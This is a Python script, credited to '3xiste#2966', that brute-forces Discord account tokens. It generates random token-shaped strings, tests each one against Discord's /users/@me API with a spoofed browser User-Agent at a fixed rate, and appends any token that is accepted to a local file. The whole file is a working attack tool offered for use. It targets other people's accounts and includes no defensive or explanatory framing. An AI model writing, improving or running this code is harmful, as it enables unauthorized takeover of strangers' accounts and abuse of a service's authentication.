
import random
import string
import time

import requests
from colorama import Fore, Style

attempts_per_second = 7 
    
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def mfa_crack():
    token = (f"mfa.{(''.join(random.choice(string.hexdigits + '-_') for _ in range(84)))}")
    
    r = requests.get(
        'https://discord.com/api/v9/users/@me',
        headers=getheaders(token))
    
    if r.status_code == 200:
        print(Fore.GREEN + f"- Valid Token. ({token}) | [{r.status_code}] | (Written to file)\n" + Style.RESET_ALL)   
        with open("valid-token.txt", "a") as f:
            f.write(f"\n{token}\n")   
             
    elif r.status_code == 401:
        print(Fore.RED + f"  ({token}) | [{r.status_code}]\n" + Style.RESET_ALL)
        
    elif r.status_code == 429:
        print(Fore.YELLOW + f" Rate limit exceded!\n" + Style.RESET_ALL)
        exit()
    
    else:
        print(Fore.YELLOW + f"Unknown error code thrown. Exiting . . . | [{r.status_code}]" + Style.RESET_ALL)
        exit()

def reg_crack():
    token = (f"{(''.join(random.choice(string.hexdigits) for _ in range(24)))}.{(''.join(random.choice(string.hexdigits) for _ in range(6)))}.{(''.join(random.choice(string.hexdigits + '-_') for _ in range(27)))}")
    
    r = requests.get(
        'https://discord.com/api/v9/users/@me',
        headers=getheaders(token))
    
    if r.status_code == 200:
        print(Fore.GREEN + f"- Valid Token. ({token}) | {r.status_code} | (Written to file)\n" + Style.RESET_ALL)    
        with open("valid-token.txt", "a") as f:
            f.write(f"\n{token}\n")    
        
    elif r.status_code == 401:
        print(Fore.RED + f" Token --> ({token})  (+) not working\n" )
        
    elif r.status_code == 429:
        print("- Rate limit exceded!\n" + Style.RESET_ALL)
        exit()
    
    else:
        print(Fore.YELLOW + f"Unknown code thrown. Exiting . . . [{r.status_code}]" + Style.RESET_ALL)
        exit()
    
def main():
    print("Made by 3xiste#2966\n")
    delay = (1 / attempts_per_second)
    print("██╗░░░██╗███████╗░█████╗░██╗░░██╗░██████╗██╗░░██╗██╗██████╗░")
    print("╚██╗░██╔╝██╔════╝██╔══██╗██║░░██║██╔════╝██║░██╔╝██║██╔══██╗")
    print("░╚████╔╝░█████╗░░███████║███████║╚█████╗░█████═╝░██║██║░░██║")
    print("░░╚██╔╝░░██╔══╝░░██╔══██║██╔══██║░╚═══██╗██╔═██╗░██║██║░░██║")
    print("░░░██║░░░███████╗██║░░██║██║░░██║██████╔╝██║░╚██╗██║██████╔╝")
    print("░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝╚═════╝░") 
    delay = (1 / attempts_per_second)
    print("")


    choice = str(input("1 Generate tokens\n2 Exit\n-> "))
    
    if choice == '1':
        while True:
            reg_crack()   
            time.sleep(delay)
            
    if choice == '2':
        while True:
            time.sleep(delay)
            print("Exiting")


            exit()

            
    else:
        exit()


if __name__ == "__main__":
    f = open("valid-token.txt", "w")
    
    try: main()
    except KeyboardInterrupt: 
        print(Style.RESET_ALL + '\n\nKeyboardInterrupt\nClosing . . .')
